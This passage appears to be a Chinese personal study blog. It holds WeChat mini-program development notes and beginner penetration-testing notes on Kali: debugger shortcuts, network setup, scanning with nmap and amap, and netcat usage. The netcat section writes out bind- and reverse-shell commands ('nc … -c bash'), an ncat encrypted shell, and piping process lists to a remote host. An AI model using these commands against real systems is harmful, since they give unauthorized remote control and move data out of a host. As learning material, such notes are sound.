<h1 id="开发"><a href="#开发" class="headerlink" title="开发"></a>开发</h1><p>从微信开发者页面下复制AppID到开发工具中，并取消使用快速模板。</p>
<p>此时项目中只有<code>project.config.json</code>文件，需要创建<code>app.json</code>文件，用作启动文件。</p>
<h1 id="文件结构"><a href="#文件结构" class="headerlink" title="文件结构"></a>文件结构</h1><p>一个小程序分为一个APP和多个Page。App又分为逻辑，公共配置，公共样式表三个文件（app.js, app.json, app.wxss），每Page分为逻辑，结构，样式表，配置（js, wxml, wxss, json）。</p>
<p>渲染层 Webview<br>逻辑层 JsCore<br>微信客户端 Native：负责网络接口</p>
<p>因此项目结构为</p>
<ul>
<li>project.config.json</li>
<li>app.js</li>
<li>app.json</li>
<li>app.wxss</li>
<li>images</li>
<li>pages<ul>
<li>about<ul>
<li>about.js</li>
<li>about.wxml</li>
<li>about.wxss</li>
<li>about.json</li>
</ul>
</li>
</ul>
</li>
</ul>
<h1 id="APP入口-app-json"><a href="#APP入口-app-json" class="headerlink" title="APP入口 app.json"></a>APP入口 app.json</h1><figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="comment">// 每个页面的访问路径，相对路径</span></span><br><span class="line">    <span class="comment">// 第一个页面为初始页面</span></span><br><span class="line">    <span class="attr">&quot;pages&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span><span class="string">&quot;pages/about/about&quot;</span><span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">    <span class="comment">// 对若干一级页面的入口链接</span></span><br><span class="line">    <span class="attr">&quot;tabBar&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;list&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">            <span class="punctuation">&#123;</span></span><br><span class="line">                <span class="attr">&quot;text&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Page 1&quot;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;pagePath&quot;</span><span class="punctuation">:</span> <span class="string">&quot;&quot;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;iconPath&quot;</span><span class="punctuation">:</span> <span class="string">&quot;&quot;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;selectedIconPath&quot;</span><span class="punctuation">:</span> <span class="string">&quot;&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="punctuation">&#125;</span></span><br><span class="line">        <span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;color&quot;</span><span class="punctuation">:</span> <span class="string">&quot;#FFFFFF&quot;</span><span class="punctuation">,</span> <span class="comment">// 文本颜色</span></span><br><span class="line">        <span class="attr">&quot;selectedColor&quot;</span><span class="punctuation">:</span> <span class="string">&quot;#000000&quot;</span></span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;window&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;navigationBarBackgroundColor&quot;</span><span class="punctuation">:</span> <span class="string">&quot;#fff&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;navigationBarTextStyle&quot;</span><span class="punctuation">:</span> <span class="string">&quot;black&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;navigationBarTitleText&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Default Title&quot;</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>

<h1 id="页面逻辑-about-js"><a href="#页面逻辑-about-js" class="headerlink" title="页面逻辑 about.js"></a>页面逻辑 about.js</h1><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 注册页面对象</span></span><br><span class="line"><span class="title class_">Page</span>(&#123;&#125;)</span><br></pre></td></tr></table></figure>

<h1 id="页面配置-about-json"><a href="#页面配置-about-json" class="headerlink" title="页面配置 about.json"></a>页面配置 about.json</h1><figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;navigationBarTitleText&quot;</span><span class="punctuation">:</span> <span class="string">&quot;About&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;navigationBarBackgroundColor&quot;</span><span class="punctuation">:</span> <span class="string">&quot;#fff&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;navigationBarTextStyle&quot;</span><span class="punctuation">:</span> <span class="string">&quot;black&quot;</span><span class="punctuation">,</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>

<h1 id="页面结构-about-wxml"><a href="#页面结构-about-wxml" class="headerlink" title="页面结构 about.wxml"></a>页面结构 about.wxml</h1><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">text</span> <span class="attr">class</span>=<span class="string">&quot;info&quot;</span>&gt;</span>Hello<span class="tag">&lt;/<span class="name">text</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h1 id="页面样式-about-wxss"><a href="#页面样式-about-wxss" class="headerlink" title="页面样式 about.wxss"></a>页面样式 about.wxss</h1><figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-class">.info</span> &#123;</span><br><span class="line">    <span class="attribute">font-weight</span>: bold;</span><br><span class="line">    <span class="attribute">font-size</span>: <span class="number">30px</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="组件"><a href="#组件" class="headerlink" title="组件"></a>组件</h1><p>通用属性：<br>class, id, style, bindtap, hidden, data-*</p>
<h2 id="View"><a href="#View" class="headerlink" title="View"></a>View</h2><p>页框。<br>作用同div。</p>
<h2 id="Image"><a href="#Image" class="headerlink" title="Image"></a>Image</h2><p>图像。<br>属性：<br>src: 可以用绝对或相对路径</p>
<h2 id="Text"><a href="#Text" class="headerlink" title="Text"></a>Text</h2><p>文本。</p>
<h2 id="Navigator"><a href="#Navigator" class="headerlink" title="Navigator"></a>Navigator</h2><p>导航。可以实现跳转。不可被text包含。默认为块级元素。<br>属性：<br>url：目标页可用绝对路径<br>open-type：redirect，重定向；默认navigate，可返回；switchTab，一级页面切换<br>hover-class：按住效果</p>
<h1 id="布局"><a href="#布局" class="headerlink" title="布局"></a>布局</h1><h2 id="传统方法"><a href="#传统方法" class="headerlink" title="传统方法"></a>传统方法</h2><figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-class">.container</span> &#123;</span><br><span class="line">    <span class="comment">/* vh表示 100%视口高度 */</span></span><br><span class="line">    <span class="attribute">height</span>: <span class="number">100vh</span>; </span><br><span class="line">    <span class="attribute">text-align</span>: center;</span><br><span class="line">&#125;</span><br><span class="line">text &#123;</span><br><span class="line">    <span class="attribute">display</span>: block;</span><br><span class="line">&#125;</span><br><span class="line">image, text &#123;</span><br><span class="line">    <span class="attribute">margin-bottom</span>: <span class="number">60px</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="弹性盒子布局"><a href="#弹性盒子布局" class="headerlink" title="弹性盒子布局"></a>弹性盒子布局</h2><p>从上往下：</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-class">.container</span>&#123;</span><br><span class="line">    <span class="attribute">height</span>: <span class="number">100vh</span>;</span><br><span class="line">    <span class="comment">/* 弹性盒子 */</span></span><br><span class="line">    <span class="attribute">display</span>: flex;</span><br><span class="line">    <span class="comment">/* 列方式 */</span></span><br><span class="line">    <span class="attribute">flex-direction</span>: column;</span><br><span class="line">    <span class="comment">/* 均匀间隔 */</span></span><br><span class="line">    <span class="attribute">justify-content</span>: space-around;</span><br><span class="line">    <span class="comment">/* 居中 */</span></span><br><span class="line">    <span class="attribute">align-items</span>: center;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="响应式单位"><a href="#响应式单位" class="headerlink" title="响应式单位"></a>响应式单位</h2><figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-class">.about-banner</span>&#123;</span><br><span class="line">    <span class="comment">/* 750rpx 所有设备的宽度规定 */</span></span><br><span class="line">    <span class="attribute">width</span>: <span class="number">375</span>rpx;</span><br><span class="line">    <span class="attribute">height</span>: <span class="number">375</span>rpx;</span><br><span class="line">    <span class="attribute">border-radius</span>: <span class="number">50%</span>;</span><br><span class="line">&#125;</span><br><span class="line">text&#123;</span><br><span class="line">    <span class="attribute">font-size</span>: <span class="number">30</span>rpx;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="数据绑定"><a href="#数据绑定" class="headerlink" title="数据绑定"></a>数据绑定</h1><p>各个层次（渲染，逻辑等）有不同的进程，之间通过数据绑定和事件机制通信。</p>
<p>在页面对象中可以定义数据：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 要绑定的数据</span></span><br><span class="line"><span class="title class_">Page</span>(&#123;</span><br><span class="line">    <span class="attr">data</span>: &#123;</span><br><span class="line">        <span class="attr">name</span>: <span class="string">&quot;&quot;</span>,</span><br><span class="line">        <span class="attr">comment</span>: <span class="string">&quot;&quot;</span>,</span><br><span class="line">        <span class="attr">imagePath</span>: <span class="string">&quot;&quot;</span>,</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">count</span>: <span class="number">100</span></span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>

<p>绑定数据到前端。</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">text</span>&gt;</span>&#123;&#123;count&#125;&#125;<span class="tag">&lt;/<span class="name">text</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h2 id="条件渲染"><a href="#条件渲染" class="headerlink" title="条件渲染"></a>条件渲染</h2><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line">重新渲染</span><br><span class="line"><span class="tag">&lt;<span class="name">text</span> <span class="attr">wx:if</span>=<span class="string">&quot;&#123;&#123;x&#125;&#125;&quot;</span>&gt;</span></span><br><span class="line">只控制可见性</span><br><span class="line"><span class="tag">&lt;<span class="name">text</span> <span class="attr">hidden</span>=<span class="string">&quot;&#123;&#123;!x&#125;&#125;&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h2 id="列表渲染"><a href="#列表渲染" class="headerlink" title="列表渲染"></a>列表渲染</h2><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">view</span> <span class="attr">wx:for</span>=<span class="string">&quot;&#123;&#123;x_list&#125;&#125;&quot;</span>&gt;</span></span><br><span class="line">&#123;&#123;index&#125;&#125;</span><br><span class="line">&#123;&#123;item.name&#125;&#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">view</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h2 id="轮播"><a href="#轮播" class="headerlink" title="轮播"></a>轮播</h2><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line">是否显示底部指示器</span><br><span class="line">是否显示前一页和后一页的一小部分</span><br><span class="line"><span class="tag">&lt;<span class="name">swiper</span> </span></span><br><span class="line"><span class="tag">    <span class="attr">indicator-dots</span>=<span class="string">&quot;&#123;&#123;true&#125;&#125;&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">previous-margin</span>=<span class="string">&quot;50rpx&quot;</span>  </span></span><br><span class="line"><span class="tag">    <span class="attr">next-margin</span>=<span class="string">&quot;50rpx&quot;</span></span></span><br><span class="line"><span class="tag">&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">swiper-item</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">text</span>&gt;</span>123<span class="tag">&lt;/<span class="name">text</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">swiper-item</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">swiper</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h2 id="生命周期"><a href="#生命周期" class="headerlink" title="生命周期"></a>生命周期</h2>]]></content>
      <categories>
        <category>前端</category>
      </categories>
      <tags>
        <tag>微信小程序</tag>
      </tags>
  </entry>
  <entry>
    <title>网络安全学习</title>
    <url>/2020/09/20/%E5%AE%89%E5%85%A8/Kali/</url>
    <content><![CDATA[<p>…</p>
<span id="more"></span>

<h1 id="综述"><a href="#综述" class="headerlink" title="综述"></a>综述</h1><p>网络安全：要求数据在互联网上：真实，可靠，完整，可控的传输与存储。</p>
<h1 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h1><h2 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a>Windows</h2><h3 id="IDA"><a href="#IDA" class="headerlink" title="IDA"></a>IDA</h3><p>快捷键：</p>
<ul>
<li><p>Space 切换 列表 图形 视图</p>
</li>
<li><p>F5 切换 伪代码</p>
</li>
<li><p>Tab 补全命令</p>
</li>
<li><p>双击 跳转到定义</p>
</li>
<li><p>X 跳转到引用</p>
</li>
<li><p>G 跳转到地址</p>
</li>
<li><p>Ctrl + E 查看入口</p>
</li>
<li><p>Ctrl + S 跳转到段 &#x2F; 搜索</p>
</li>
<li><p>Alt + T 打开文本搜索对话框</p>
</li>
<li><p>Alt + I 搜索立即数</p>
</li>
<li><p>Alt + B 搜索二进制</p>
</li>
<li><p>Shift + F12 打开字符串窗口</p>
</li>
<li><p>Alt + M 添加书签</p>
</li>
<li><p>Ctrl + M 列出所有书签</p>
</li>
<li><p>Ctrl + Alt + B 列出断点列表</p>
</li>
<li><p>F7 单步进入</p>
</li>
<li><p>F8 单步跳过</p>
</li>
<li><p>Ctrl + F7 运行到函数返回地址</p>
</li>
<li><p>F4 运行到光标处</p>
</li>
<li><p>R ASCII 数字 切换显示</p>
</li>
<li><p>H 十进制 十六进制 切换显示</p>
</li>
<li><p><code>;</code> 注释 交叉参考处显示</p>
</li>
<li><p><code>:</code> 注释 只在该处显示</p>
</li>
<li><p><code>-/+</code> 合并&#x2F;展开 可视化视图</p>
</li>
<li><p>Ctrl + Enter 下一项</p>
</li>
<li><p>N 重命名</p>
</li>
<li><p>Y 修改 函数签名 或 变量类型</p>
</li>
<li><p>D 数据类型转化 byte word dword qword</p>
</li>
<li><p><code>*</code> 转化 变量 为 数组</p>
</li>
<li><p>Alt + * 设置数组大小</p>
</li>
<li><p>A 转化为 字符串首地址</p>
</li>
<li><p>Alt + A 设置字符串编码格式</p>
</li>
<li><p>Shift + S 创建结构体</p>
</li>
</ul>
<h3 id="OD"><a href="#OD" class="headerlink" title="OD"></a>OD</h3><p>快捷键：</p>
<ul>
<li><p>Ctrl + F2 重启程序</p>
</li>
<li><p>Alt + F2 关闭程序</p>
</li>
<li><p>F3 打开程序</p>
</li>
<li><p>Alt + F5 OD总在最前</p>
</li>
<li><p>Alt + B 断点窗口</p>
</li>
<li><p>Alt + C CPU窗口</p>
</li>
<li><p>Alt + E 模块列表</p>
</li>
<li><p>Alt + K 调用栈</p>
</li>
<li><p>Alt + L 日志</p>
</li>
<li><p>Alt + M 内存</p>
</li>
<li><p>Alt + O 选项</p>
</li>
<li><p>Alt + X 关闭 OD</p>
</li>
<li><p>Ctrl + P 补丁窗口</p>
</li>
<li><p>Ctrl + T RUN 对话框</p>
</li>
<li><p>F10 打开快捷菜单</p>
</li>
<li><p>Enter 将当前命令添加到历史</p>
</li>
<li><p>Backspace 移除该部分的自动分析信息</p>
</li>
<li><p>Alt + Backspace 撤销</p>
</li>
<li><p>Ctrl + A 分析当前代码</p>
</li>
<li><p>Ctrl + B 二进制搜索</p>
</li>
<li><p>Ctrl + C 复制</p>
</li>
<li><p>Ctrl + E 二进制编辑</p>
</li>
<li><p>Ctrl + F 命令搜索</p>
</li>
<li><p>Ctrl + G 跳转到地址</p>
</li>
<li><p>Ctrl + J 列出相关的调用和跳转</p>
</li>
<li><p>Ctrl + K 查看调用树</p>
</li>
<li><p>Ctrl + L 搜索下一个</p>
</li>
<li><p>Ctrl + N 打开名称列表</p>
</li>
<li><p>Ctrl + O 扫描Object</p>
</li>
<li><p>Ctrl + R 搜索所选命令</p>
</li>
<li><p>Ctrl + S 命令搜索</p>
</li>
<li><p>Space 修改命令</p>
</li>
<li><p>F2 切换断点</p>
</li>
<li><p>F4 执行到这一行</p>
</li>
<li><p>Shift + F4 设置记录断点</p>
</li>
<li><p>F7 单步进入</p>
</li>
<li><p>F8 单步跳过</p>
</li>
<li><p>F9 运行到断点</p>
</li>
<li><p>Alt + F9 执行到返回用户代码段</p>
</li>
<li><p>F12 停止执行</p>
</li>
<li><p>Esc 停止自动跟踪</p>
</li>
</ul>
<p>命令插件：</p>
<ul>
<li>calc 判断表达式</li>
<li>watch 监视表达式</li>
<li>at 跳转到地址</li>
<li>orig 反汇编与EIP</li>
<li>dump 转存</li>
<li>da 转存为反汇编</li>
<li>db 16进制转存</li>
<li>dc ASCII 转存</li>
<li>dd 存入堆栈</li>
<li>du unicode 转存</li>
<li>dw word 转存</li>
<li>bp 下断点</li>
<li>bpd 清除全部调用中的断点</li>
<li>bc 清除断点</li>
<li>brk 查看断点窗口</li>
<li>opt 打开选项设置窗口</li>
<li>rst 重新运行当前程序</li>
<li>help 查看 API 函数的帮助</li>
</ul>
<h2 id="Kali"><a href="#Kali" class="headerlink" title="Kali"></a>Kali</h2><h3 id="GDB"><a href="#GDB" class="headerlink" title="GDB"></a>GDB</h3><h3 id="PWNDGB"><a href="#PWNDGB" class="headerlink" title="PWNDGB"></a>PWNDGB</h3><h1 id="Kali-渗透测试"><a href="#Kali-渗透测试" class="headerlink" title="Kali 渗透测试"></a>Kali 渗透测试</h1><h2 id="标准"><a href="#标准" class="headerlink" title="标准"></a>标准</h2><p><a href="http://www.pentest-standard.org/">PETS</a>：</p>
<ul>
<li>前期交互，获取范围，一次一个系统</li>
<li>情报收集，安全防护机制</li>
<li>威胁建模</li>
<li>漏洞分析</li>
<li>渗透攻击</li>
<li>后渗透测试</li>
<li>报告</li>
</ul>
<h2 id="定制系统"><a href="#定制系统" class="headerlink" title="定制系统"></a>定制系统</h2><h3 id="路由配置"><a href="#路由配置" class="headerlink" title="路由配置"></a>路由配置</h3><p>强制DHCP客户端请求IP</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">dhclient eth0</span><br></pre></td></tr></table></figure>

<p>临时自定义IP</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 设置 IP 和 网关</span></span><br><span class="line">ifconfig eth0 192.168.0.102/24</span><br><span class="line">route add default gw 192.168.0.1 <span class="comment"># gw: Gate Way</span></span><br><span class="line"><span class="comment"># 添加静态路由</span></span><br><span class="line">route add -net 192.168.0.0/24 gw 192.168.0.1 eht0</span><br><span class="line"><span class="comment"># 配置 DNS (永久保存)</span></span><br><span class="line"><span class="built_in">echo</span> nameserver 192.168.0.1&gt;/etc/resolv.conf</span><br></pre></td></tr></table></figure>

<p>设置永久IP</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">vi /etc/network/interfaces</span><br><span class="line"><span class="comment"># 默认</span></span><br><span class="line">iface eth0 inet dhcp</span><br><span class="line"><span class="comment"># 改为 静态</span></span><br><span class="line">iface eth0 inet static</span><br><span class="line">address 192.168.0.102</span><br><span class="line">netmask 255.255.255.0</span><br><span class="line">gateway 192.168.0.1</span><br><span class="line">dns-nameservers 192.168.0.1</span><br><span class="line"><span class="comment"># up 当网卡启动后执行</span></span><br><span class="line">up route add -net 192.168.0.0/24 gw 192.168.0.1 eth0</span><br><span class="line"><span class="comment"># down 当网卡卸载后执行</span></span><br><span class="line">down route del -net 192.168.0.0/24 </span><br></pre></td></tr></table></figure>

<h3 id="系统更新"><a href="#系统更新" class="headerlink" title="系统更新"></a>系统更新</h3><p>切换更新源</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">deb http://mirrors.ustc.edu.cn/kali kali main non-free contrib </span><br><span class="line">deb-src http://mirrors.ustc.edu.cn/kali kali main non-free contrib </span><br><span class="line">deb http://mirrors.ustc.edu.cn/kali-security kali/updates main contrib non-free</span><br></pre></td></tr></table></figure>

<p>更新软件</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">apt-get update</span><br><span class="line">apt-get update --fix-missing</span><br><span class="line">apt-get upgrade</span><br><span class="line">apt-get dist-upgrade  <span class="comment"># 大版本升级</span></span><br></pre></td></tr></table></figure>

<h3 id="浏览器插件"><a href="#浏览器插件" class="headerlink" title="浏览器插件"></a>浏览器插件</h3><p>Firefox</p>
<ul>
<li>autoproxy  代理 </li>
<li>Tamper Data  HTTP 包 查看 修改</li>
<li>cookie importer  导入Cookie</li>
<li>Cookies Manager  管理Cookie</li>
<li>User Agent Switcher  修改浏览器特征</li>
<li>HackBar  F9  注入，参数修改，Post等</li>
<li>Live http header  拦截 HTTP 头</li>
<li>Firebug  调试</li>
<li>Flagfox  显示国籍</li>
<li>hashr  计算哈希</li>
<li><a href="https://addons.mozilla.org/en-US/firefox/addon/xss-me/">xss me</a>  自动化跨站脚本攻击</li>
<li><a href="https://addons.mozilla.org/en-US/firefox/addon/sql-inject-me/?src=ss">sql inject me</a>  SQL 注入</li>
</ul>
<h3 id="网络工具"><a href="#网络工具" class="headerlink" title="网络工具"></a>网络工具</h3><h4 id="NC-NETCAT"><a href="#NC-NETCAT" class="headerlink" title="NC - NETCAT"></a>NC - NETCAT</h4><ul>
<li>侦听 传输 模式</li>
<li>Telnet 获取 banner</li>
<li>传输文本</li>
<li>传输文件</li>
<li>加密传输文件</li>
<li>远程控制</li>
<li>加密所有流量</li>
<li>流媒体服务器</li>
<li>远程克隆硬盘</li>
</ul>
<p>但是NCAT是明文传输，会被嗅探到。</p>
<p>当作 Telnet 使用</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -v 显示详细输出内容 </span></span><br><span class="line"><span class="comment"># -n 不进行DNS解析</span></span><br><span class="line">nc -nv 192.168.0.102 80</span><br></pre></td></tr></table></figure>

<p>侦听端口</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -l 侦听</span></span><br><span class="line">nc -l -p 9001 </span><br><span class="line">nc -l -p 9001 &gt; ps.txt</span><br><span class="line"><span class="comment"># 收集信息</span></span><br><span class="line">ps aux | nc -nv 192.168.0.1 3333 -q 1 <span class="comment"># -q 等待 1 秒退出</span></span><br></pre></td></tr></table></figure>

<p>传输文件目录</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 接收</span></span><br><span class="line">nc -lp 3333 &gt; main.mp4</span><br><span class="line">nc -nv 192.168.0.1 3333 &lt; main.mp4 -q 1</span><br><span class="line"><span class="comment"># 发送</span></span><br><span class="line">nc -q 1 -lp 3333 &lt; main.mp4</span><br><span class="line">nc -nv 192.168.0.1 3333 &gt; main.mp4</span><br><span class="line"><span class="comment"># 传输目录</span></span><br><span class="line">tar -cvf - music/ | nc -lp 3333 -q 1 <span class="comment"># 打包目录</span></span><br><span class="line">nc -nv 192.168.0.1 3333 | tar -xvf - <span class="comment"># 解包目录</span></span><br></pre></td></tr></table></figure>

<p>流媒体</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cat</span> 1.mp4 | nc -lp 3333</span><br><span class="line">nc -nv 192.168.0.1 3333 | mplayer -vo x11 -cache 3000 - </span><br></pre></td></tr></table></figure>

<p>端口扫描</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">nc -nvz 192.168.0.1 1-65535  <span class="comment"># TCP</span></span><br><span class="line">nc -nvzu 192.168.0.1 1-65535 <span class="comment"># UDP</span></span><br></pre></td></tr></table></figure>

<p>硬盘克隆</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">nc -lp 3333 | <span class="built_in">dd</span> of=/dev/sda</span><br><span class="line"><span class="built_in">dd</span> <span class="keyword">if</span>=/dev/sda | nc -nv 192.168.0.1 3333 -q 1</span><br></pre></td></tr></table></figure>

<p>远程控制</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 正向</span></span><br><span class="line">nc -lp 3333 -c bash</span><br><span class="line">nc 192.168.0.1 3333</span><br><span class="line"><span class="comment"># 反向</span></span><br><span class="line">nc -lp 3333 </span><br><span class="line">nc 192.168.0.1 3333 -c bash</span><br></pre></td></tr></table></figure>

<h4 id="NCAT"><a href="#NCAT" class="headerlink" title="NCAT"></a>NCAT</h4><p>由于NC缺乏加密能力，因此可以使用Ncat。</p>
<p>加密连接</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">ncat -c bash --allow 192.168.20.14 -vnl 3333 -ssl</span><br><span class="line">ncat -nv 192.168.0.102 3333 -ssl</span><br></pre></td></tr></table></figure>

<h4 id="Base64"><a href="#Base64" class="headerlink" title="Base64"></a>Base64</h4><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="built_in">base64</span> content</span><br><span class="line"><span class="comment"># Ctrl + D 计算</span></span><br></pre></td></tr></table></figure>


<h3 id="其他配置"><a href="#其他配置" class="headerlink" title="其他配置"></a>其他配置</h3><ul>
<li>ibus 输入法</li>
<li>Java </li>
<li>笔记本模式</li>
<li>并发线程限制：限制当前shell内进程资源<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 查看默认值</span></span><br><span class="line"><span class="built_in">ulimit</span> -a </span><br><span class="line"><span class="comment"># 限制堆栈</span></span><br><span class="line"><span class="built_in">ulimit</span> -s 100</span><br><span class="line"><span class="comment"># 限制内存</span></span><br><span class="line"><span class="built_in">ulimit</span> -m 5000 -v 5000</span><br></pre></td></tr></table></figure></li>
</ul>
<h2 id="被动信息收集"><a href="#被动信息收集" class="headerlink" title="被动信息收集"></a>被动信息收集</h2><p>公开渠道可获取的信息，不与目标系统接触。基于媒体，搜索引擎等。<br><a href="http://www.fas.org/irp/doddir/army/atp2-22-9.pdf">资料1</a><br><a href="http://information-retrieval.info/docs/NATO-OSINT.html">资料2</a></p>
<h3 id="域名"><a href="#域名" class="headerlink" title="域名"></a>域名</h3><p>FQDN：主机名是bigserver，域名是mycompany.com，那么FQDN就是bigserver.mycompany.com。</p>
<p>记录类型：</p>
<ul>
<li>C NAME - 解析为其他域名</li>
<li>A &#x2F; NS - 域名解析为IP </li>
<li>PTR - IP解析为域名</li>
</ul>
<p>NS LOOKUP</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">nslookup www.sina.com.cn</span><br><span class="line"><span class="comment"># 找到 A 记录</span></span><br><span class="line">&gt; <span class="built_in">set</span> <span class="built_in">type</span>=a <span class="comment"># 只查A记录</span></span><br><span class="line">&gt; <span class="built_in">set</span> <span class="built_in">type</span>=mx <span class="comment"># 查MX记录  邮件交换记录</span></span><br><span class="line">&gt; sina.com </span><br><span class="line"></span><br><span class="line"><span class="comment"># -q 同 -typq</span></span><br><span class="line">nslookup -q=any 163.com</span><br><span class="line">nslookup 163.com -q=any 114.114.114.114</span><br></pre></td></tr></table></figure>

<p>DIG</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">dig 163.com any</span><br><span class="line">dig 163.com any @8.8.8.8</span><br></pre></td></tr></table></figure>

<h2 id="主动信息收集"><a href="#主动信息收集" class="headerlink" title="主动信息收集"></a>主动信息收集</h2><h3 id="主机扫描"><a href="#主机扫描" class="headerlink" title="主机扫描"></a>主机扫描</h3><h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><h3 id="服务扫描"><a href="#服务扫描" class="headerlink" title="服务扫描"></a>服务扫描</h3><p>Banner 搜索，但是准确度不可靠。</p>
<ul>
<li>nc</li>
<li>Python 通过 Socket 发起连接获取 Banner</li>
<li>dmitry </li>
<li>nmap 通过 banner 脚本实现</li>
<li>amap 专门用来发现服务<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">nc -nv x.x.x.x 22</span><br><span class="line"><span class="comment"># 输出 Banner</span></span><br><span class="line"><span class="comment"># SSH-2.0-OpenSSH_4.7p1 Debian-8ubuntu1</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># p tcp port , b read banner</span></span><br><span class="line">dmitry -pd x.x.x.x</span><br><span class="line"></span><br><span class="line"><span class="comment"># sT 完整 TCP -p端口范围</span></span><br><span class="line"><span class="comment"># 脚本目录  /usr/share/nmap/script</span></span><br><span class="line">nmap -sT x.x.x.x -p1-100 --script=banner.nse</span><br><span class="line"></span><br><span class="line">amap -B x.x.x.x 21</span><br><span class="line">amap -B x.x.x.x 1-100</span><br><span class="line">amap -B x.x.x.x 1-100 | grep on</span><br></pre></td></tr></table></figure></li>
</ul>
<p>Nmap 可以根据特征库识别目标系统和服务</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 依据特征识别</span></span><br><span class="line">nmap x.x.x.x -p1-100 -sV</span><br><span class="line">amap x.x.x.x 1-100 -qb</span><br></pre></td></tr></table></figure>

<h3 id="操作系统扫描"><a href="#操作系统扫描" class="headerlink" title="操作系统扫描"></a>操作系统扫描</h3><p>依据TTL，默认值，不准确</p>
<ul>
<li>Windows 65-128</li>
<li>Linux Unix 1-64</li>
<li>某些Unix 255</li>
</ul>
<p>使用Nmap</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">nmap -O x.x.x.x</span><br></pre></td></tr></table></figure>

<p>专门用来识别操作系统的工具，不如Nmap</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">xprobe2 x.x.x.x</span><br></pre></td></tr></table></figure>

<p>被动扫描方式：<br>部署在网络出口，通过网络抓包，镜像端口等方式。</p>
<p>SNMP 扫描：</p>
<ul>
